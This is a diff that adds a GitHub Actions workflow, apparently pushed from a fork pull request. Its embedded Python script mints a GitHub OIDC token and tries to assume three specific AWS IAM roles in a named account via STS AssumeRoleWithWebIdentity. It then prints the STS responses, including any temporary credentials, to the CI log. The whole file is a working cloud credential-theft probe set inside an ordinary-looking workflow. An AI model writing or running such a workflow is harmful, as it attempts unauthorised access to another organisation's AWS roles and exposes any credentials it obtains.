@@ -1,0 +1,49 @@
+name: i125246-fork-oidc
+on:
+  pull_request:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  fork-pr-token:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: fork-pr-mint-and-test
+        run: |
+          python3 - <<'PY'
+          import json, os, urllib.request, urllib.error, urllib.parse, base64
+          out={'event':os.environ.get('GITHUB_EVENT_NAME'),'repo':os.environ.get('GITHUB_REPOSITORY'),'ref':os.environ.get('GITHUB_REF'),
+               'has_token_url':bool(os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')),'has_token_tok':bool(os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN'))}
+          base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          if not base or not tok:
+              out['mint']='NO_ID_TOKEN_ENV'
+              print('I125246_FORK_RESULT='+json.dumps(out)); raise SystemExit(0)
+          try:
+              url=base+('&' if '?' in base else '?')+'audience='+urllib.parse.quote('sts.amazonaws.com')
+              req=urllib.request.Request(url,headers={'Authorization':'Bearer '+tok,'Accept':'application/json','User-Agent':'i125246-fork'})
+              r=urllib.request.urlopen(req,timeout=30)
+              j=json.loads(r.read())['value']
+              p=j.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+              out['mint']='OK'; out['token_len']=len(j)
+              out['claims']={k:c.get(k) for k in ('sub','aud','iss','repository','repository_owner','ref','event_name','environment','job_workflow_ref','actor','actor_id')}
+              def post(data):
+                  body=urllib.parse.urlencode(data).encode()
+                  rq=urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'i125246-fork'})
+                  try:
+                      rr=urllib.request.urlopen(rq,timeout=35); return rr.status, rr.read().decode('utf-8','replace')[:600]
+                  except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:600]
+                  except Exception as e: return -1, str(e)[:200]
+              for arn in ['arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole',
+                          'arn:aws:iam::159553542841:role/adai-template-publisher',
+                          'arn:aws:iam::159553542841:role/i125246-nonexistent-control']:
+                  st,b=post({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'i125246fork','WebIdentityToken':j,'DurationSeconds':'3600'})
+                  out['sts::'+arn]={'http':st,'body':b}
+          except urllib.error.HTTPError as e:
+              out['mint']='HTTP_%s'%e.code; out['mint_body']=e.read().decode('utf-8','replace')[:400]
+          except Exception as e:
+              out['mint']='ERR'; out['mint_err']=str(e)[:300]
+          print('I125246_FORK_RESULT='+json.dumps(out))
+          PY
